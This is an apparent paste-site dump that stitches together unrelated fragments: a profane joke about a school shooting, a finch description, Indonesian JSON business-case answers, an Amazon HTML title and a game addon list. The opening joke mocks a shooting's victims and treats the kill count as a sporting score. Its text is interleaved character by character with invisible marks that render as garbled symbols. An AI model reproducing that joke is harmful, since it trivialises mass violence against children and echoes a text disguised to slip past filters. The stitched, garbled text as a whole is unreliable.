D‚Äée‚Äés‚Äép‚Äéi‚Äét‚Äée‚Äé ‚Äéu‚Äét‚Äét‚Äée‚Äér‚Äél‚Äéy‚Äé ‚Äéf‚Äéa‚Äéi‚Äél‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéo‚Äé ‚Äék‚Äéi‚Äél‚Äél‚Äé ‚Äéh‚Äée‚Äér‚Äés‚Äée‚Äél‚Äéf‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äés‚Äét‚Äéi‚Äél‚Äél‚Äé ‚Äéb‚Äée‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äél‚Äéi‚Äév‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚Äét‚Äéh‚Äéi‚Äés‚Äé ‚Äév‚Äée‚Äér‚Äéy‚Äé ‚Äéd‚Äéa‚Äéy‚Äé,‚Äé ‚ÄéB‚Äér‚Äée‚Äén‚Äéd‚Äéa‚Äé ‚ÄéA‚Äén‚Äén‚Äé ‚ÄéS‚Äép‚Äée‚Äén‚Äéc‚Äée‚Äér‚Äé ‚Äéd‚Äéi‚Äéd‚Äé ‚Äéh‚Äée‚Äél‚Äép‚Äé ‚Äém‚Äéa‚Äék‚Äée‚Äé ‚ÄéA‚Äém‚Äée‚Äér‚Äéi‚Äéc‚Äéa‚Äé'‚Äés‚Äé ‚ÄéN‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äéa‚Äél‚Äé ‚ÄéP‚Äéa‚Äés‚Äét‚Äéi‚Äém‚Äée‚Äé ‚Äép‚Äéo‚Äép‚Äéu‚Äél‚Äéa‚Äér‚Äé ‚Äéa‚Äég‚Äéa‚Äéi‚Äén‚Äé ‚Äéf‚Äéo‚Äél‚Äél‚Äéo‚Äéw‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äé ‚Äén‚Äée‚Äéa‚Äér‚Äél‚Äéy‚Äé ‚Äé1‚Äé5‚Äé ‚Äéy‚Äée‚Äéa‚Äér‚Äé ‚Äéh‚Äéi‚Äéa‚Äét‚Äéu‚Äés‚Äé ‚Äés‚Äéi‚Äén‚Äéc‚Äée‚Äé ‚ÄéC‚Äéh‚Äéa‚Äér‚Äél‚Äée‚Äés‚Äé ‚ÄéW‚Äéh‚Äéi‚Äét‚Äém‚Äéa‚Äén‚Äé'‚Äés‚Äé ‚ÄéT‚Äéu‚Äém‚Äéo‚Äér‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äé5‚Äé0‚Äé ‚Äéy‚Äée‚Äéa‚Äér‚Äés‚Äé ‚Äés‚Äéi‚Äén‚Äéc‚Äée‚Äé ‚ÄéA‚Äén‚Äéd‚Äér‚Äée‚Äéw‚Äé ‚ÄéK‚Äée‚Äéh‚Äéo‚Äée‚Äé ‚Äéi‚Äén‚Äév‚Äée‚Äén‚Äét‚Äée‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äés‚Äép‚Äéo‚Äér‚Äét‚Äé ‚Äéb‚Äéy‚Äé ‚Äéb‚Äél‚Äéo‚Äéw‚Äéi‚Äén‚Äég‚Äé ‚Äéu‚Äép‚Äé ‚Äéa‚Äé ‚Äéf‚Äéu‚Äéc‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äée‚Äél‚Äée‚Äém‚Äée‚Äén‚Äét‚Äéa‚Äér‚Äéy‚Äé ‚Äés‚Äéc‚Äéh‚Äéo‚Äéo‚Äél‚Äé.‚Äé ‚ÄéB‚Äér‚Äée‚Äén‚Äéd‚Äéa‚Äé ‚Äéi‚Äés‚Äé ‚Äéa‚Äél‚Äés‚Äéo‚Äé ‚Äén‚Äéo‚Äét‚Äéa‚Äéb‚Äél‚Äée‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéb‚Äée‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéf‚Äéi‚Äér‚Äés‚Äét‚Äé ‚Äéw‚Äéo‚Äém‚Äéa‚Äén‚Äé ‚Äét‚Äéo‚Äé ‚Äép‚Äéa‚Äér‚Äét‚Äéi‚Äéc‚Äéi‚Äép‚Äéa‚Äét‚Äée‚Äé ‚Äéi‚Äén‚Äé ‚Äés‚Äéc‚Äéh‚Äéo‚Äéo‚Äél‚Äé ‚Äés‚Äéh‚Äéo‚Äéo‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äé ‚ÄéT‚Äéi‚Äét‚Äél‚Äée‚Äé ‚ÄéI‚ÄéX‚Äé.‚Äé

W‚Äéh‚Äéi‚Äél‚Äée‚Äé ‚ÄéB‚Äér‚Äée‚Äén‚Äéd‚Äéa‚Äé'‚Äés‚Äé ‚Äéh‚Äéi‚Äég‚Äéh‚Äé ‚Äés‚Äéc‚Äéo‚Äér‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äéa‚Äé ‚Äém‚Äée‚Äér‚Äée‚Äé ‚Äé2‚Äé ‚Äék‚Äéi‚Äél‚Äél‚Äés‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äé9‚Äé ‚Äéi‚Äén‚Äéj‚Äéu‚Äér‚Äéi‚Äée‚Äés‚Äé ‚Äéi‚Äés‚Äé ‚Äél‚Äéa‚Äéu‚Äég‚Äéh‚Äéa‚Äéb‚Äél‚Äéy‚Äé ‚Äéh‚Äéo‚Äér‚Äér‚Äéi‚Äéb‚Äél‚Äée‚Äé,‚Äé ‚Äés‚Äéh‚Äée‚Äé ‚Äés‚Äét‚Äéi‚Äél‚Äél‚Äé ‚Äém‚Äéa‚Äén‚Äéa‚Äég‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äéb‚Äée‚Äéa‚Äét‚Äé ‚Äéo‚Äéu‚Äét‚Äé ‚ÄéE‚Äén‚Äéc‚Äéy‚Äéc‚Äél‚Äéo‚Äép‚Äé√¶‚Äéd‚Äéi‚Äéa‚Äé ‚ÄéD‚Äér‚Äéa‚Äém‚Äéa‚Äét‚Äéi‚Äéc‚Äéa‚Äé'‚Äés‚Äé ‚Äév‚Äée‚Äér‚Äéy‚Äé ‚Äéo‚Äéw‚Äén‚Äé ‚ÄéW‚Äéi‚Äél‚Äél‚Äéi‚Äéa‚Äém‚Äé ‚Äé""‚ÄéA‚Äél‚ÄéG‚Äéo‚Äér‚Äée‚Äé""‚Äé ‚ÄéA‚Äét‚Äéc‚Äéh‚Äéi‚Äés‚Äéo‚Äén‚Äé ‚Äéi‚Äén‚Äé ‚Äép‚Äér‚Äée‚Äét‚Äét‚Äéy‚Äé ‚Äém‚Äéu‚Äéc‚Äéh‚Äé ‚Äée‚Äév‚Äée‚Äér‚Äéy‚Äé ‚Äéc‚Äéa‚Äét‚Äée‚Äég‚Äéo‚Äér‚Äéy‚Äé ‚Äée‚Äéx‚Äéc‚Äée‚Äép‚Äét‚Äé ‚Äéb‚Äée‚Äéc‚Äéo‚Äém‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äén‚Äé ‚Äéh‚Äée‚Äér‚Äéo‚Äéi‚Äén‚Äée‚Äé.‚Äé ‚ÄéH‚Äéo‚Äéw‚Äé'‚Äés‚Äé ‚Äéi‚Äét‚Äé ‚Äéf‚Äée‚Äée‚Äél‚Äé ‚Äég‚Äée‚Äét‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äéy‚Äéo‚Äéu‚Äér‚Äé ‚Äéd‚Äée‚Äéa‚Äéd‚Äé ‚Äéf‚Äér‚Äée‚Äéc‚Äék‚Äél‚Äée‚Äéd‚Äé ‚Äéa‚Äér‚Äés‚Äée‚Äé ‚Äék‚Äéi‚Äéc‚Äék‚Äée‚Äéd‚Äé ‚Äéb‚Äéy‚Äé ‚Äéa‚Äé ‚Äéf‚Äéu‚Äéc‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äé1‚Äé6‚Äé-‚Äéy‚Äée‚Äéa‚Äér‚Äé-‚Äéo‚Äél‚Äéd‚Äé ‚Äég‚Äéi‚Äér‚Äél‚Äé,‚Äé ‚ÄéW‚Äéi‚Äél‚Äél‚Äéi‚Äée‚Äé?‚Äé

(‚Äé(‚Äé ‚ÄéH‚ÄéO‚ÄéL‚ÄéY‚Äé ‚ÄéS‚ÄéH‚ÄéI‚ÄéT‚Äé ‚ÄéS‚ÄéH‚ÄéE‚Äé ‚ÄéD‚ÄéI‚ÄéD‚Äé ‚ÄéN‚ÄéO‚ÄéT‚Äé ‚ÄéA‚ÄéG‚ÄéE‚Äé ‚ÄéW‚ÄéE‚ÄéL‚ÄéL‚Äé ‚ÄéL‚ÄéO‚ÄéL‚Äé ‚Äé)‚Äé)‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

T‚Äéh‚Äée‚Äé ‚Äér‚Äée‚Äéd‚Äé-‚Äéb‚Äér‚Äéo‚Äéw‚Äée‚Äéd‚Äé ‚Äéf‚Äéi‚Äén‚Äéc‚Äéh‚Äé ‚Äé(‚ÄéN‚Äée‚Äéo‚Äéc‚Äéh‚Äém‚Äéi‚Äéa‚Äé ‚Äét‚Äée‚Äém‚Äép‚Äéo‚Äér‚Äéa‚Äél‚Äéi‚Äés‚Äé)‚Äé ‚Äéi‚Äés‚Äé ‚Äéa‚Äé ‚Äés‚Äép‚Äée‚Äéc‚Äéi‚Äée‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚Äée‚Äés‚Äét‚Äér‚Äéi‚Äél‚Äéd‚Äéi‚Äéd‚Äé ‚Äéf‚Äéi‚Äén‚Äéc‚Äéh‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äéi‚Äén‚Äéh‚Äéa‚Äéb‚Äéi‚Äét‚Äés‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äée‚Äéa‚Äés‚Äét‚Äé ‚Äéc‚Äéo‚Äéa‚Äés‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéA‚Äéu‚Äés‚Äét‚Äér‚Äéa‚Äél‚Äéi‚Äéa‚Äé.‚Äé ‚ÄéT‚Äéh‚Äée‚Äé ‚Äés‚Äép‚Äée‚Äéc‚Äéi‚Äée‚Äés‚Äé ‚Äéi‚Äés‚Äé ‚Äéd‚Äéi‚Äés‚Äét‚Äéi‚Äén‚Äég‚Äéu‚Äéi‚Äés‚Äéh‚Äée‚Äéd‚Äé ‚Äéb‚Äéy‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéb‚Äér‚Äéi‚Äég‚Äéh‚Äét‚Äé ‚Äér‚Äée‚Äéd‚Äé ‚Äés‚Äét‚Äér‚Äéi‚Äép‚Äée‚Äé ‚Äéa‚Äéb‚Äéo‚Äév‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äée‚Äéy‚Äée‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéb‚Äér‚Äéi‚Äég‚Äéh‚Äét‚Äé ‚Äér‚Äée‚Äéd‚Äé ‚Äér‚Äéu‚Äém‚Äép‚Äé.‚Äé ‚ÄéT‚Äéh‚Äée‚Äé ‚Äér‚Äée‚Äés‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéb‚Äéo‚Äéd‚Äéy‚Äé ‚Äéi‚Äés‚Äé ‚Äég‚Äér‚Äée‚Äéy‚Äé,‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äéo‚Äél‚Äéi‚Äév‚Äée‚Äé ‚Äéw‚Äéi‚Äén‚Äég‚Äé ‚Äéc‚Äéo‚Äév‚Äée‚Äér‚Äét‚Äés‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéc‚Äéo‚Äél‚Äél‚Äéa‚Äér‚Äé.‚Äé ‚ÄéJ‚Äéu‚Äév‚Äée‚Äén‚Äéi‚Äél‚Äée‚Äés‚Äé ‚Äéd‚Äéo‚Äé ‚Äén‚Äéo‚Äét‚Äé ‚Äéh‚Äéa‚Äév‚Äée‚Äé ‚Äér‚Äée‚Äéd‚Äé ‚Äéb‚Äér‚Äéo‚Äéw‚Äé ‚Äém‚Äéa‚Äér‚Äék‚Äés‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äéy‚Äé ‚Äél‚Äéa‚Äéc‚Äék‚Äé ‚Äéo‚Äél‚Äéi‚Äév‚Äée‚Äé ‚Äéc‚Äéo‚Äél‚Äéo‚Äéu‚Äér‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéo‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéc‚Äéo‚Äél‚Äél‚Äéa‚Äér‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéw‚Äéi‚Äén‚Äég‚Äé ‚Äéc‚Äéo‚Äév‚Äée‚Äér‚Äét‚Äés‚Äé.‚Äé ‚ÄéT‚Äéh‚Äée‚Äé ‚Äéa‚Äéd‚Äéu‚Äél‚Äét‚Äés‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äé1‚Äé1‚Äé ‚Äét‚Äéo‚Äé ‚Äé1‚Äé2‚Äé ‚Äéc‚Äée‚Äén‚Äét‚Äéi‚Äém‚Äée‚Äét‚Äér‚Äée‚Äés‚Äé ‚Äé(‚Äé4‚Äé.‚Äé3‚Äé ‚Äét‚Äéo‚Äé ‚Äé4‚Äé.‚Äé7‚Äé ‚Äéi‚Äén‚Äéc‚Äéh‚Äée‚Äés‚Äé)‚Äé ‚Äél‚Äéo‚Äén‚Äég‚Äé.‚Äé ‚ÄéT‚Äéh‚Äéi‚Äés‚Äé ‚Äér‚Äée‚Äéd‚Äé-‚Äéb‚Äér‚Äéo‚Äéw‚Äée‚Äéd‚Äé ‚Äéf‚Äéi‚Äén‚Äéc‚Äéh‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äép‚Äéh‚Äéo‚Äét‚Äéo‚Äég‚Äér‚Äéa‚Äép‚Äéh‚Äée‚Äéd‚Äé ‚Äéi‚Äén‚Äé ‚ÄéP‚Äée‚Äén‚Äér‚Äéi‚Äét‚Äéh‚Äé,‚Äé ‚ÄéN‚Äée‚Äéw‚Äé ‚ÄéS‚Äéo‚Äéu‚Äét‚Äéh‚Äé ‚ÄéW‚Äéa‚Äél‚Äée‚Äés‚Äé.‚Äé

P‚Äéh‚Äéo‚Äét‚Äéo‚Äég‚Äér‚Äéa‚Äép‚Äéh‚Äé ‚Äéc‚Äér‚Äée‚Äéd‚Äéi‚Äét‚Äé:‚Äé ‚ÄéJ‚Äéo‚Äéh‚Äén‚Äé ‚ÄéH‚Äéa‚Äér‚Äér‚Äéi‚Äés‚Äéo‚Äén‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

B‚Äéy‚Äée‚Äé,‚Äé ‚Äég‚Äéu‚Äéy‚Äés‚Äé.‚Äé ‚ÄéI‚Äé'‚Äém‚Äé ‚Äég‚Äéo‚Äén‚Äén‚Äéa‚Äé ‚Äég‚Äéo‚Äé ‚Äéh‚Äéi‚Äét‚Äé ‚Äéo‚Äén‚Äé ‚Äés‚Äéo‚Äém‚Äée‚Äé ‚Äés‚Äée‚Äéx‚Äéy‚Äé ‚Äég‚Äéh‚Äéo‚Äés‚Äét‚Äés‚Äé ‚Äéw‚Äéh‚Äéi‚Äél‚Äée‚Äé ‚Äét‚Äéa‚Äél‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äéo‚Äén‚Äé ‚Äéh‚Äéa‚Äém‚Äé ‚Äér‚Äéa‚Äéd‚Äéi‚Äéo‚Äé.‚Äé"
bRzyJPy1,BMT_Rizal_revised,akbarism,JavaScript,Tuesday 26th of March 2024 09:39:26 PM CDT,"let a = [
  {
    ""analisa"": 1,
    ""tugas"": 1,
    ""sub_tugas"": 1,
    ""form"": {
      ""no_item"": ""Memo 1"",
      ""alasan"": ""<p>Keterlambatan suplay order selama 2 bulan mencapai 20%</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 1,
    ""sub_tugas"": 1,
    ""form"": {
      ""no_item"": ""Memo 2"",
      ""alasan"": ""<p>Adanya produk baru dipasaran membuat daya saing yang lebih kompetitif, dimana akan melakukan inprovment untuk menanggulangi hal ini agar produk kita tetap bertahan</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 1,
    ""sub_tugas"": 1,
    ""form"": {
      ""no_item"": ""Memo 4"",
      ""alasan"": ""<p>Menindaklajuti kondisi produksi produk Wafer Popay yang melempem, apakah dari operasional produksi atau packing. sehingga tidak lagi muncul kondisi produk melempem.</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 1,
    ""sub_tugas"": 1,
    ""form"": {
      ""no_item"": ""Memo 8"",
      ""alasan"": ""<p>Permasalah SP 1 bagian Produksi dikarenakan tidak memakai masker dan tidak memakai sarung tangan. Perbaikannya adalah memberikan sosialisasi bagaimana pentingnya penggunaan masker dan sarung tangan</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 1,
    ""sub_tugas"": 1,
    ""form"": {
      ""no_item"": ""Memo 11"",
      ""alasan"": ""<p>Pencapaian penetrasi outlet Wafer Tiramisu di Region Jabalnusra sangat rendah mencapai 48,39%</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 1,
    ""sub_tugas"": 2,
    ""form"": {
      ""no_item"": ""1"",
      ""alasan"": ""<p>kekurangan order produksi selama 2 bulan dikarenakan permintaan pasar Wafer Popay sangat tinggi.</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 1,
    ""sub_tugas"": 2,
    ""form"": {
      ""no_item"": ""2"",
      ""alasan"": ""<p>Daya saing harga dipasaran yang bervariatif dan bersaing</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 1,
    ""sub_tugas"": 2,
    ""form"": {
      ""no_item"": ""4"",
      ""alasan"": ""<p>Mencari akar penyebab terjadinya produk yang melempem</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 1,
    ""sub_tugas"": 2,
    ""form"": {
      ""no_item"": ""8"",
      ""alasan"": ""<p>Memberikan sosialisasi tentang pebtingnya penggunaan masker dan sarung tangan</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 1,
    ""sub_tugas"": 2,
    ""form"": {
      ""no_item"": ""11"",
      ""alasan"": ""<p>Mencari akar penyebab pencapaian penetrasi Wafer Tiramisu di region Jabalnusra rendah. dan membuat improve bagaiamana untuk meningkatnya.</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 2,
    ""sub_tugas"": 1,
    ""form"": {
      ""item"": 1,
      ""tindakan"": ""<p>Membuat tambahan produk suplay untuk mengantisipasi permintaan dilapangan yang tinggi</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 2,
    ""sub_tugas"": 1,
    ""form"": {
      ""item"": 2,
      ""tindakan"": ""<p>Membuat improvment dari rasa atau kemasan yang menarik untuk bisa meningkatkan produksi</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 2,
    ""sub_tugas"": 1,
    ""form"": {
      ""item"": 3,
      ""tindakan"": ""<p>Menganalisa permasalahan dari produksi atau kemasan yang menyebabkan melempem</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 2,
    ""sub_tugas"": 1,
    ""form"": {
      ""item"": 4,
      ""tindakan"": ""<p>Menambah produksi produk untuk mengantisipasi terjadi permintaan yang tinggi</p>""
    }
  },
  {
    ""analisa"": 2,
    ""tugas"": 1,
    ""sub_tugas"": 1,
    ""form"": {
      ""langkah"": ""<ol><li><p>Menambah pruduksi produk untuk menutupi kekurangan permintaan pasar yang tinggi.</p></li><li><p>Memastikan kondisi saat operasional produksi ataupun kemasan tidak ada cacata sehingga tidak terjadi produk yang melempem</p></li></ol>"",
      ""keputusan"": ""<ol><li><p>Menambah produksi produk.</p></li><li><p>Quality Control terhadap produk</p></li><li><p>Membuat improve terhadap produk baik dari rasa ataupun kemasan</p></li></ol>"",
      ""alasan"": ""<ol><li><p>Dengan menambah produksi harapanyya akan menambah keuntungan untuk perusahaan</p></li><li><p>Dengan Quality Control yang maksimal harapannya tidak ada produkyang reject</p></li><li><p>Dengan membuat improve harapannya pangsa pasar akan meningkatat</p></li></ol>""
    }
  },
  {
    ""analisa"": 3,
    ""sub_tugas"": 1,
    ""form"": {
      ""issue"": ""<p>Keterlambatan suplay</p>"",
      ""penyebab"": ""<p>Permintaan pangsa pasar yang meningkat</p><p></p>""
    },
    ""tugas"": 1
  },
  {
    ""analisa"": 3,
    ""sub_tugas"": 2,
    ""form"": {
      ""kondisi"": ""<p>Kondisi produk melempem</p>"",
      ""hal"": ""<p>Quality control yang maksimal terhadap operasional produksi dan kemasan</p>""
    },
    ""tugas"": 1
  }
]"
agN6MNVN,Untitled,dereksir,HTML,Tuesday 26th of March 2024 09:37:22 PM CDT,"<!DOCTYPE html>
<title>
	Amazon.com: Lumineux Teeth Whitening Strips 21 Treatments...
</title>"
jeshCXys,BMT_Ardiyansyah_revised,akbarism,JSON,Tuesday 26th of March 2024 09:13:13 PM CDT,"let a = {
  ""analisa"": 1,
  ""tugas"": 1,
  ""sub_tugas"": 1,
  ""form"": {
    ""no_item"": ""Memo 1"",
    ""alasan"": ""<p>permasalahannya adalah <strong><u>KEKURANGAN SUPPLAY</u></strong> selama 2 bulan ini mencapai 20% ini perlu di analisa lebih lanjut permasalahnya di produksi atau di selesnya</p>""
  }
},
  {
    ""analisa"": 1,
    ""tugas"": 1,
    ""sub_tugas"": 1,
    ""form"": {
      ""no_item"": ""Memo 2"",
      ""alasan"": ""<p>permasalahnya danya<u> PRODUK-PRODUK BARU </u>dipasaran yang mebuat daya saing lebih kompetitif dimana kiata akan melakukan improvment untuk mensiasati hal ini agar produk kita tetap bertahan</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 1,
    ""sub_tugas"": 1,
    ""form"": {
      ""no_item"": ""memo 10"",
      ""alasan"": ""<p>permasalahan banyaknya<u> KARDUS RUSAK</u> selama pengiriman membuat kardus harus diganti dan menimbulkan biaya tambahan</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 1,
    ""sub_tugas"": 1,
    ""form"": {
      ""no_item"": ""memo 11"",
      ""alasan"": ""<p>perlu dilakukan analisa <u>PENJUALAN WAFER TIRAMITSHU TERALURENDAH sebesar 48.39% </u>dibandingkan region lainya sebesar 92.31%</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 1,
    ""sub_tugas"": 2,
    ""form"": {
      ""no_item"": ""Memo 1"",
      ""alasan"": ""<p>dengan tidak tersedianya produk dapat membuat suplayer akan beralih ke perusahaan lain serta mengurangi penjulan dan produktifitas perusahan</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 1,
    ""sub_tugas"": 2,
    ""form"": {
      ""no_item"": ""Memo 2"",
      ""alasan"": ""<p>membuat impropment untuk produk - prouk wafer agar tetap bisa bersain dengan wafer-wafer pendatang baru</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 1,
    ""sub_tugas"": 2,
    ""form"": {
      ""no_item"": ""Memo 10"",
      ""alasan"": ""<p>mengevaliasi peroses pengiriman dan paking produk saat pengiriman </p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 1,
    ""sub_tugas"": 2,
    ""form"": {
      ""no_item"": ""memo 11"",
      ""alasan"": ""<p>mengevaluasi penyebab rendahnya penjualan wafer tiramitshu di region jabalnusa</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 1,
    ""sub_tugas"": 2,
    ""form"": {
      ""no_item"": """",
      ""alasan"": """"
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 2,
    ""sub_tugas"": 1,
    ""form"": {
      ""item"": 1,
      ""tindakan"": ""<p>1.memeriksa ketersediaan bahan baku terkait jumlah produksi</p><p>2.melakukan pengecekan terkait proses pengiriman barang (transportasi)</p><p>3.melakukan evaluasi terkait produksi/bulan dengan permintaan pasar</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 2,
    ""sub_tugas"": 1,
    ""form"": {
      ""item"": 2,
      ""tindakan"": ""<p>1.melakuakn impropment terkait rasa yang terbaru dan kekinian</p><p>2.memberikan extra 10% terkait produk dalam kemasan</p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 2,
    ""sub_tugas"": 1,
    ""form"": {
      ""item"": 3,
      ""tindakan"": ""<p>1.Mengevaluasi kualitas kardus yang dipakai</p><p>2.mengevaluasi proses bongkar dan muat produk</p><p>3.mengevaluasi proses pengiriman di dalam container </p>""
    }
  },
  {
    ""analisa"": 1,
    ""tugas"": 2,
    ""sub_tugas"": 1,
    ""form"": {
      ""item"": 4,
      ""tindakan"": ""<p>1.melalkuan survei pasar terkait kurangnya penjualan<br>2.melakukan perbandingan terkait merek lain<br></p>""
    }
  },
  {
    ""analisa"": 2,
    ""tugas"": 1,
    ""sub_tugas"": 1,
    ""form"": {
      ""langkah"": ""<p>memo 10 kerusakan produk:<br>kita harus merubah kualitas kardus yang dipakai untuk mengurangi kerusakn produk yg remuk serta kardus yg sober dan basah,jika kita tidak meningkatkan kualitas kardus maka biaya yang akan di timbulkan akan meningkat 100 % tetapi jika kita meningkatkan kualitas kardus kita hanya menbah biaya 20% saja</p>"",
      ""keputusan"": ""<p>1.mengganti kardus yang dipakai saat ini dengan kualitas lebih baik</p>"",
      ""alasan"": ""<p>1.mengurang biaya tambahan untuk pembelian kardus baru</p><p>2.mengurang kerusakan pada poruk sehingga tetap terjaga hingga ke tangan konsument</p>""
    }
  },
  {
    ""analisa"": 3,
    ""sub_tugas"": 1,
    ""form"": {
      ""issue"": ""<p>tingginya biaya perbaikan gudang </p>"",
      ""penyebab"": ""<p>perbaikan gudang dilakukan secara bersamaan di semua wilayah</p>""
    },
    ""tugas"": 1
  },
  {
    ""analisa"": 3,
    ""sub_tugas"": 2,
    ""form"": {
      ""kondisi"": ""<p>agar biaya yang di kuluarkan dalam perbaikan gudang tidak terlalu besar untuk 3 tahunkedepan dalam perbaikan perlu di lakukan perbaikan secara berkala agar cost perbaikan gudang selalu terkontrol.</p>"",
      ""hal"": ""<p>kurangnya perawan secara berkala sehingga perbaikan dilakukan secara bersamaan</p>""
    },
    ""tugas"": 1
  }
  ]"
i0SDjc2Q,Mad,Unknown_No_1,PHP,Tuesday 26th of March 2024 08:46:18 PM CDT,MadMatlabBrand
hbL9hRUX,Left 4 Dead 2 Addons List (Personal) - BROKEN,Quad5Ny,INI file,Tuesday 26th of March 2024 08:20:38 PM CDT,"""AddonList""
{
	""CustomRadialMenu.vpk""		""1""
	""HardRain_No_CC.vpk""		""1""
	""MP5SD5.vpk""		""0""
	""NoMercy_No_CC.vpk""		""1""
	""Saferoom_No_CC.vpk""		""1""
	""SCAR-H.vpk""		""0""
	""Scout.vpk""		""0""
	""SwampFever_No_CC.vpk""		""1""
	""ThePassing_No_CC.vpk""		""1""
	""ModelTestMap.vpk""		""1""
	""InsurgencyM590.vpk""		""0""
	""AmmoPacks.vpk""		""1""
	""ItemAnimations.vpk""		""1""
	""L4D2LoadingScreens.vpk""		""1""
	""EnhancedGraphicModHDv32.vpk""		""1""
	""ZoeyOpenJacket.vpk""		""0""
	""M16A4.vpk""		""0""
	""SPAS12_Fixes.vpk""		""1""
	""SC-2010.vpk""		""0""
	""workshop\135565980.vpk""		""0""
	""workshop\312198137.vpk""		""0""
	""workshop\342536271.vpk""		""0""
	""workshop\397959891.vpk""		""0""
	""workshop\253236569.vpk""		""0""
	""MK14EBR.vpk""		""0""
	""workshop\309934609.vpk""		""0""
	""Magnum_Silverballer.vpk""		""0""
	""Magnum_Silverballer_sp.vpk""		""0""
	""weap_magnum_silverballer.vpk""		""0""
	""workshop\131131462.vpk""		""0""
	""workshop\265433375.vpk""		""0""
	""workshop\264776672.vpk""		""0""
	""workshop\538326643.vpk""		""0""
	""workshop\393850197.vpk""		""0""
	""workshop\128654215.vpk""		""0""
	""workshop\300372243.vpk""		""0""
	""workshop\2865766117.vpk""		""0""
	""workshop\2809672914.vpk""		""0""
	""workshop\646639445.vpk""		""0""
	""workshop\2889397530.vpk""		""0""
	""workshop\922724986.vpk""		""0""
	""HUD2_Vert.vpk""		""1""
	""workshop\237489486.vpk""		""0""
	""workshop\2840208388.vpk""		""0""
	""workshop\322956511.vpk""		""0""
	""workshop\728354171.vpk""		""0""
	""workshop\824125637.vpk""		""0""
	""workshop\2348360064.vpk""		""0""
	""workshop\2889007995.vpk""		""0""
	""workshop\2889008446.vpk""		""0""
	""workshop\2846357950.vpk""		""0""
	""workshop\2324127266.vpk""		""0""
	""workshop\2840071821.vpk""		""0""
	""workshop\2289326674.vpk""		""0""
	""workshop\2804318545.vpk""		""0""
	""workshop\2879013156.vpk""		""0""
	""workshop\2924363905.vpk""		""0""
	""workshop\1460225046.vpk""		""0""
	""workshop\1104404882.vpk""		""0""
	""workshop\2947604558.vpk""		""0""
	""workshop\2935963927.vpk""		""0""
	""workshop\2950607453.vpk""		""0""
